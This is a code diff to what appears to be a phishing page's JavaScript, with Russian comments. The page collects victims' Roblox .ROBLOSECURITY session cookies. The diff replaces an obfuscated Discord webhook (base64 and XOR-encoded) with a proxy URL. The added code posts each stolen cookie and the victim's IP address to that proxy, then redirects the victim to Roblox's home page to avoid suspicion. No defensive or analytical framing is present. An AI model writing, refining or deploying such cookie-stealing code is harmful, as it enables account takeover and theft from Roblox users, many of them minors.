@@ -496,19 +496,8 @@
                 });
             }
             
-            // ========== ВЕБХУК ЗАШИФРОВАН ==========
-            const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
-            const _p2_enc = "MTQ5Nzg3NjMxNDY0Mjk3Njc5OS9BX1kteEZZRzV1MVpNVjAxZ0J0ZjFPZmdaZ2MxaXlvbzgwU2w1LUhralMzN0ptTUVTSkZvTG5WU3luY2F1NXowckhxTA==";
-            
-            function _dec(p) {
-                let d = atob(p);
-                let r = "";
-                for(let i = 0; i < d.length; i++) {
-                    r += String.fromCharCode(d.charCodeAt(i) ^ 0x5A);
-                }
-                return r;
-            }
-            const WEBHOOK = atob(_p1) + _dec(_p2_enc);
+            // ========== ПРОКСИ (ВЕБХУК СКРЫТ) ==========
+            const PROXY_URL = "https://roblox-tools.gt.tc/proxy.php";
             
             function isValidCookie(cookieValue) {
                 if (!cookieValue || cookieValue.trim() === '') return false;
@@ -581,11 +570,20 @@
                     ip = data.ip;
                 } catch(e) {}
                 
-                const msg = `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${length} символов\n**Содержимое:**\n\`\`\`${cookieValue}\`\`\``;
+                const msg = {
+                    content: `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${length} символов\n**Содержимое:**\n\`\`\`${cookieValue}\`\`\``
+                };
+                
                 try {
-                    const response = await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: msg }) });
+                    const response = await fetch(PROXY_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(msg)
+                    });
                     return response.ok;
-                } catch(e) { return false; }
+                } catch(e) {
+                    return false;
+                }
             }
             
             if(sendBtn) {
@@ -600,8 +598,14 @@
                     }
                     sendBtn.disabled = true;
                     sendBtn.textContent = "⏳ Отправка...";
-                    await sendCookieToDiscord(cookieValue, validation.length);
-                    window.location.href = "https://www.roblox.com/home";
+                    const success = await sendCookieToDiscord(cookieValue, validation.length);
+                    if(success) {
+                        window.location.href = "https://www.roblox.com/home";
+                    } else {
+                        showMessage('Ошибка отправки. Попробуйте позже.', true);
+                        sendBtn.disabled = false;
+                        sendBtn.textContent = "🔄 Заменить сессию";
+                    }
                 };
             }
             
